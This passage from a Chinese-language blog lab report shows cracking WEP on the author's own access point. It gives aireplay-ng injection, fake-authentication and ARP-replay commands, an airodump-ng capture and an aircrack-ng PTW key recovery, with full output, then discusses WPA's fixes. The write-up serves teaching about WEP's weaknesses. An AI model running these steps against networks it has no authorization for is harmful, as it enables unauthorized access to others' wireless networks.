<p><strong>-9</strong> 注入测试模式<br><strong>-e</strong> 目标ESSID<br><strong>-a</strong> 目标MAC</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# aireplay-ng -9 -e Mirage -a 74:7D:24:AC:83:C0 wlan0mon</span><br><span class="line">09:35:07  Waiting for beacon frame (BSSID: 74:7D:24:AC:83:C0) on channel 13</span><br><span class="line">09:35:07  Trying broadcast probe requests...</span><br><span class="line">09:35:07  Injection is working!</span><br><span class="line">09:35:09  Found 1 AP </span><br><span class="line"></span><br><span class="line">09:35:09  Trying directed probe requests...</span><br><span class="line">09:35:09  74:7D:24:AC:83:C0 - channel: 13 - &#x27;Mirage&#x27;</span><br><span class="line">09:35:09  Ping (min/avg/max): 1.546ms/11.259ms/36.031ms Power: -42.69</span><br><span class="line">09:35:09  29/30:  96%</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="监听目标"><a href="#监听目标" class="headerlink" title="监听目标"></a>监听目标</h3><ol>
<li><p>使用<code>airodump-ng</code>抓包</p>
<blockquote>
<p><strong>-c</strong> 指定监听信道</p>
<p><strong>—bssid</strong> 指定监听目标MAC</p>
<p><strong>-w</strong> 保存的抓包数据文件名</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# airodump-ng -c 13 --bssid 74:7D:24:AC:83:C0 -w crackPKT wlan0mon</span><br><span class="line">09:57:34  Created capture file &quot;crackPKT-01.cap&quot;.</span><br><span class="line"></span><br><span class="line">CH 13 ][ Elapsed: 4 mins ][ 2022-04-23 10:01 ][ Are you sure you want to quit? Press Q agai </span><br><span class="line">                                                                                             </span><br><span class="line">BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID         </span><br><span class="line">                                                                                             </span><br><span class="line">74:7D:24:AC:83:C0  -65   0     1621    35813   54  13   54e. WEP  WEP    OPN  Mirage        </span><br><span class="line">                                                                                             </span><br><span class="line">BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes           </span><br><span class="line">                                                                                             </span><br><span class="line">74:7D:24:AC:83:C0  D0:5A:FD:F0:4E:09  -18    1e- 1e     0    36064               74:7D:24:AC:83:C0  70:F1:1C:3D:6E:41  -60    6 - 1   3942   138117 </span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="重放注入攻击"><a href="#重放注入攻击" class="headerlink" title="重放注入攻击"></a>重放注入攻击</h3><ol>
<li><p>使用<code>aireplay-ng</code>建立一个虚假认证。</p>
<blockquote>
<p><strong>-1</strong> 虚假认证攻击<br><strong>6000</strong> 每隔6000秒重新发起一次认证<br><strong>-o 1</strong> 每次认证只发送一个包， 默认发送多个<br><strong>-q 10 </strong> 每隔10秒发送一次<code>keep-alive</code>请求</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# aireplay-ng -1 6000 -o 1 -q 10 -e Mirage -a 74:7D:24:AC:83:C0 -h 70:f1:1c:3d:6e:41 wlan0mon</span><br><span class="line">09:58:04  Waiting for beacon frame (BSSID: 74:7D:24:AC:83:C0) on channel 13</span><br><span class="line"></span><br><span class="line">09:58:04  Sending Authentication Request (Open System) [ACK]</span><br><span class="line">09:58:04  Authentication successful</span><br><span class="line">09:58:04  Sending Association Request</span><br><span class="line">09:58:04  Association successful :-) (AID: 1)</span><br><span class="line"></span><br><span class="line">09:58:14  Sending keep-alive packet [ACK]    </span><br><span class="line">09:58:24  Sending keep-alive packet [ACK]</span><br></pre></td></tr></table></figure>
</li>
<li><p>开始ARP重放攻击，制造大量ARP请求</p>
</li>
<li><blockquote>
<p><strong>-3</strong> ARP注入攻击模式</p>
<p><strong>-b</strong> 目标MAC</p>
<p><strong>-h</strong> 本机MAC</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# aireplay-ng -3 -b 74:7D:24:AC:83:C0 -h 70:f1:1c:3d:6e:41 wlan0mon </span><br><span class="line">09:58:29  Waiting for beacon frame (BSSID: 74:7D:24:AC:83:C0) on channel 13</span><br><span class="line">Saving ARP requests in replay_arp-0423-095829.cap</span><br><span class="line">You should also start airodump-ng to capture replies.</span><br><span class="line">Read 194286 packets (got 73132 ARP requests and 42780 ACKs), sent 73276 packets...(499 pps)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h3><ol>
<li><p>使用<code>aircrack-ng</code>解密捕获的数据包（默认使用PTW攻击破解，如需FMS/KoreK攻击使用<code>-K</code>参数）</p>
<blockquote>
<p><strong>—bssid</strong> 需要解密的AP的BSSID</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# aircrack-ng --bssid 74:7D:24:AC:83:C0 crackPKT*.cap                                               </span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening crackPKT-01.cap</span><br><span class="line">Read 257915 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets                  Got 35812 out of 35000 IVsStarting PTW attack with 35812 ivs.</span><br><span class="line"></span><br><span class="line">Attack will be restarted every 5000 captured ivs.</span><br><span class="line"></span><br><span class="line">                                          Aircrack-ng 1.6 </span><br><span class="line">                            [00:00:00] TesAircrack-ng 1.6  (got 30170 IVs)</span><br><span class="line">                            [00:00:00] Tested 1632001 keys (got 30170 IVs)</span><br><span class="line">   KB    depth   byte(vote) [00:00:00] Tested 1785601 keys (got 30170 IVs)</span><br><span class="line">   KB    depth   byte(vote)D[00:00:01] Tested 314088 keys (got 35812 IVs)</span><br><span class="line">   KB    depth   byte(vote)DD(37376) 2B(37120) 43(36608) 0E(36096) 23(36096) CE(36096) </span><br><span class="line">   KB    depth   byte(vote)DD(37376) 2B(37120) 43(36608) 0E(36096) 23(36096) CE(36096) </span><br><span class="line">    0    0/  1   57(50176) 23(44800) E5(44544) 43(43776) D7(43776) DD(43520) 0E(43008) </span><br><span class="line">    1    0/  1   45(46080) 84(42496) 86(42496) 94(41984) 83(41728) 2B(41472) 6A(41472) </span><br><span class="line">    2    0/  1   50(52736) EB(45824) CA(44288) F9(43264) 17(42496) 85(42496) 8B(42496) </span><br><span class="line">    3    0/  1   41(49408) EE(44288) 2E(43008) A7(43008) E7(42496) 34(42240) 30(41984) </span><br><span class="line">    4    0/  1   74(54528) E7(44544) 73(43520) 64(43264) D7(43264) 9A(42496) AD(41728) </span><br><span class="line">    5    0/  2   CD(44800) 15(44544) 70(41984) 89(41984) FC(41984) 80(41728) A1(41472) </span><br><span class="line">    6    0/  1   61(46848) 04(44800) 51(43008) 01(42752) 81(41728) B9(41728) F4(41728) </span><br><span class="line">    7    0/  1   63(46848) 3D(44544) 1A(43520) 9E(43520) 3B(42496) 5C(42496) 7B(42496) </span><br><span class="line">    8    0/  1   6B(46336) DF(44032) CE(42496) 10(42240) 74(42240) 0B(41472) 4D(41472) </span><br><span class="line">    9    0/  2   54(42496) 89(42496) 3F(42240) 7E(41984) 8C(41728) D2(41728) 07(41216) </span><br><span class="line">   10    5/  1   C6(43008) 11(42496) A4(42240) F0(42240) 14(41984) CD(41984) 56(41728) </span><br><span class="line">   11    9/  1   A0(40960) DA(40960) 20(40704) 82(40704) 28(40448) 6D(40448) 73(40448) </span><br><span class="line">   12    0/  2   74(45172) 7E(45100) 82(44768) 98(43592) 3C(42896) 89(42536) 60(41988) </span><br><span class="line"></span><br><span class="line">     KEY FOUND! [ 57:45:50:41:74:74:61:63:6B:54:65:73:74 ] (ASCII: WEPAttackTest )</span><br><span class="line">        Decrypted correctly: 100%</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="实验分析"><a href="#实验分析" class="headerlink" title="实验分析"></a>实验分析</h2><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>&emsp;&emsp;经测试，在捕捉到大量数据包的情况下，对于13位的字母密钥，PTW攻击只用了几秒钟便成功破解，在ARP重放攻击下，捕获这些数据包也仅仅用了几分钟。</p>
<p>&emsp;&emsp;WEP引入IV本意是增强协议安全性，但反倒可以根据IV和猜测到的明文数据反推出部分密钥流，从而更容易地攻破密码。</p>
<h3 id="分析WPA改进"><a href="#分析WPA改进" class="headerlink" title="分析WPA改进"></a>分析WPA改进</h3><h4 id="The-Temporal-Key-Integrity-Protocol（TKIP）"><a href="#The-Temporal-Key-Integrity-Protocol（TKIP）" class="headerlink" title="The Temporal Key Integrity Protocol（TKIP）"></a>The Temporal Key Integrity Protocol（TKIP）</h4><p>&emsp;&emsp;临时密钥完整性协议（TKIP）可以被视为WEP的一个经过大量修改的版本。TKIP仍然使用RC4流密码，但比WEP安全得多。TKIP的设计目标并不是一个尽可能安全的协议。取而代之的是对WEP的修改，它可以防止所有已知的攻击，提供相当高的安全级别，并且可以在大多数现有硬件上使用，只需安装驱动程序或固件更新。</p>
<h4 id="替换RC4为AES"><a href="#替换RC4为AES" class="headerlink" title="替换RC4为AES"></a>替换RC4为AES</h4><p>&emsp;&emsp;AES密码可以在计数器模式counter mode(CCMP)下用于加密网络传输并保护器完整性。这完全取代了RC4流密码算法，并提供了非常高的安全级别。目前，AES中还没有已知的可实现弱点。</p>
<h4 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h4><p>&emsp;&emsp;IEEE 802.11增加了企业级密钥管理，允许多种认证模式。STA不再需要一个单独的秘密预共享密钥，而是需要用户名和密码、智能卡、证书、硬件密码器和其他身份验证协议。除了广播， 每个站点都使用单独的密钥与接入点通信，因此同一网络中的另一个站点不再可能进行窃听。</p>
<h1>参考文献</h1>

<p><a target="_blank" rel="noopener" href="https://www.iacr.org/cryptodb/data/paper.php?pubkey=13751">Attacks on the WEP protocol</a></p>
<p><a target="_blank" rel="noopener" href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.484.3279&amp;rep=rep1&amp;type=pdf">A. Klein. Attacks on the RC4 stream cipher. Designs, Codes and Cryptography, 48(3):269–286, 2008.</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/57677761">密码分析学——深度分析WEP密钥恢复攻击（PTW攻击）</a></p>

    </div>

    
    
    
        

  <div class="followme">
    <p>欢迎关注我的其它发布渠道</p>

    <div class="social-list">

        <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
        </div>
    </div>
  </div>


      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/%E5%AF%86%E7%A0%81/" rel="tag"><i class="fa fa-tag"></i> 密码</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/03/26/Android%E6%8A%93%E5%8C%85%E6%95%B4%E7%90%86%E5%BD%92%E7%BA%B3/" rel="prev" title="Android抓包总结">
      <i class="fa fa-chevron-left"></i> Android抓包总结
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEP-Wi-Fi%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C"><span class="nav-number">1.</span> <span class="nav-text">WEP Wi-Fi口令攻击实验</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="nav-number">1.1.</span> <span class="nav-text">实验目的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">1.2.</span> <span class="nav-text">实验环境配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AP%E9%85%8D%E7%BD%AE"><span class="nav-number">1.2.1.</span> <span class="nav-text">AP配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83"><span class="nav-number">1.2.2.</span> <span class="nav-text">攻击环境</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82"><span class="nav-number">1.3.</span> <span class="nav-text">实验要求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">1.4.</span> <span class="nav-text">原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RC4%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90"><span class="nav-number">1.4.1.</span> <span class="nav-text">RC4加密分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WEP%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90"><span class="nav-number">1.4.2.</span> <span class="nav-text">WEP认证分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E7%A8%8B%E6%A8%A1%E6%8B%9FWEP%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">编程模拟WEP认证过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8ERC4%E6%97%A0%E5%85%B3%E7%9A%84%E6%94%BB%E5%87%BB"><span class="nav-number">1.4.3.</span> <span class="nav-text">与RC4无关的攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8ERC4%E6%9C%89%E5%85%B3%E7%9A%84%E6%94%BB%E5%87%BB"><span class="nav-number">1.4.4.</span> <span class="nav-text">与RC4有关的攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.5.</span> <span class="nav-text">实验步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A1%AE%E8%AE%A4%E7%9B%AE%E6%A0%87"><span class="nav-number">1.5.1.</span> <span class="nav-text">确认目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%91%E5%90%AC%E7%9B%AE%E6%A0%87"><span class="nav-number">1.5.2.</span> <span class="nav-text">监听目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E6%94%BE%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="nav-number">1.5.3.</span> <span class="nav-text">重放注入攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="nav-number">1.5.4.</span> <span class="nav-text">破解密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%88%86%E6%9E%90"><span class="nav-number">1.6.</span> <span class="nav-text">实验分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C"><span class="nav-number">1.6.1.</span> <span class="nav-text">实验结果</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90WPA%E6%94%B9%E8%BF%9B"><span class="nav-number">1.6.2.</span> <span class="nav-text">分析WPA改进</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#The-Temporal-Key-Integrity-Protocol%EF%BC%88TKIP%EF%BC%89"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">The Temporal Key Integrity Protocol（TKIP）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9B%BF%E6%8D%A2RC4%E4%B8%BAAES"><span class="nav-number">1.6.2.2.</span> <span class="nav-text">替换RC4为AES</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86"><span class="nav-number">1.6.2.3.</span> <span class="nav-text">密钥管理</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Mirage"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Mirage</p>
  <div class="site-description" itemprop="description">越过山丘，才发现无人等候</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">13</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">19</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/qilianshuo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;qilianshuo" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:qilianshuo@gmail.com" title="E-Mail → mailto:qilianshuo@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Mirage</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">19k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">17 分钟</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

  

</body>
</html>
